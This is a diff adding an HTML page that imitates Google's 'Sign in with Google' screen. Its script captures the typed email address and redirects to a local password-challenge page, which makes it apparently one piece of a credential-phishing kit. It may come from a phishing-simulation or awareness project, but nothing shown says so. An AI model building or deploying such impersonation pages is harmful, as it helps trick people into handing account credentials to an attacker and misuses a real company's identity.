@@ -1,0 +1,23 @@
+<!DOCTYPE html>
+<html>
+<head><title>Sign in - Google</title></head>
+<body>
+  <h1>Sign in with Google</h1>
+  <form id="email-form">
+    <label>Email or phone</label>
+    <input type="email" name="identifier" autofocus>
+    <div id="identifierNext">
+      <button type="submit">Next</button>
+    </div>
+  </form>
+  <script>
+    document.getElementById('email-form').addEventListener('submit', function(e) {
+      e.preventDefault();
+      var email = document.querySelector('input[type="email"]').value;
+      if (email) {
+        window.location = '/google/challenge-pwd.html?email=' + encodeURIComponent(email);
+      }
+    });
+  </script>
+</body>
+</html>
